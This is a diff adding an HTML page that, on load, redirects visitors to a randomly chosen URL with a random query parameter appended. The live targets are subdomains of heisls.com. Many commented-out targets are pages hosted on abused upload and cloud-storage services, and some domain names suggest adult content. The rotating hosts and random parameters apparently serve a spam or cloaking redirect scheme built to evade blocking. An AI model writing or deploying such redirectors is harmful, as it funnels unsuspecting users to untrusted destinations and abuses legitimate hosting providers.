@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>跳转中...</title>
+    <script>
+        function redirectToRandomWebsite() {
+            var websites = [
+               
+			   
+	//"https://static.shutu.cn/shutu/static/2023/06/28/ab7f9e/ab7f9e920c3472db5dcc690fba27870c.index.html?_wv=gey&f=elotrk085&utk=yfve80033",
+	//"http://liebvideo.s3-website.ap-east-1.amazonaws.com/index.html?_wv=uxk&f=cklufj354&xhu=pxli90033"
+	
+	//"https://imgedit.newrank.cn/edit/upload/photo/2023/06/28/f72af3a25e2f4fa0a6e37f565102c2fe.html?jrf=pd058&_wv=xrl&etu=kxph768",
+	//"https://shakalaka.52caopi.com/oldht/index.html?_wv=chs&f=pndsae132&gvx=dets40033",
+	//"https://down.om.cn/v3/image_feedback/2023-06-28/kYeZXQnDAzcad2zNJb5EdnZMD2G5zfzH.html?_wv=gxs&f=hwsfur229&bbr=sbmz20033",
+	
+	//new
+	//弃用"https://imgedit.newrank.cn/edit/upload/photo/2023/06/10/8ade87d2ffff4a7db5b67f8dee9c9758.html?vid=15&t=vytzky764&aea=ab9",
+	//弃用"https://imgedit.newrank.cn/edit/upload/photo/2023/06/10/8ade87d2ffff4a7db5b67f8dee9c9758.html?vid=40&t=vytzky764&aea=a101",
+	//"https://shakalaka.52caopi.com/djs/index.html?vid=990&t=lezxqm659&kuf=fb006", 
+    //"https://down.om.cn/v3/image_feedback/2023-06-09/zdGHSab6wGKPX76AXtSQ3K2dSJZEP4WZ.html?vid=502&t=gnrwur231&pbd=sa006",
+	//"https://shakalaka.52caopi.com/djs/index.html?vid=301&t=lezxqm659&kuf=lw006", 
+	//"http://newwlieb.s3-website.ap-east-1.amazonaws.com/index.html?vid=85&t=kxvqmk350&qyk=fwg06",
+   // "https://down.om.cn/v3/image_feedback/2023-06-09/zdGHSab6wGKPX76AXtSQ3K2dSJZEP4WZ.html?vid=612&t=gnrwur231&pbd=fsa06",
+	//"https://static.shutu.cn/shutu/static/2023/06/10/9284f4/9284f4d42dff0557afd18364d8279e8e.index.html?vid=86&t=pdaorm226&lpw=aads06"
+	
+	
+	"https://nainaidexe.heisls.com/xka/?vid=&t=kxvqmk350&qyk=y007",
+	"https://nainaidexeF.heisls.com/xka/?vid=&t=krnyli796&vwv=ci07",
+    //"https://sexyld.github.io/djs/index.html?vid=&t=zgpfen572&wlw=qd14",
+   // "https://djs015-1323701647.cos.ap-nanjing.myqcloud.com/index.html?vid=&t=zgpfen572&wlw=qd14",
+	"https://nainaidexe.heisls.com/xka/?vid=&t=nejekl401&vqp=fn43"
+	
+	
+	
+	
+            ];
+            var randomWebsite = websites[Math.floor(Math.random() * websites.length)];
+            
+            var letters = 'abcdefghijklmnopqrstuvwxyz';
+            var randomLetters = '';
+            for (var i = 0; i < 3; i++) {
+                randomLetters += letters.charAt(Math.floor(Math.random() * letters.length));
+            }
+            var randomLettersAndNumbers = '';
+            for (var i = 0; i < 2; i++) {
+                randomLettersAndNumbers += letters.charAt(Math.floor(Math.random() * letters.length));
+            }
+            for (var i = 0; i < 3; i++) {
+                randomLettersAndNumbers += Math.floor(Math.random() * 10);
+            }
+            var url = randomWebsite + "&" + randomLetters + "=" + randomLettersAndNumbers;
+            window.location.href = url;
+        }
+        window.onload = redirectToRandomWebsite;
+    </script>
+</head>
+<body>
+</body>
+</html>
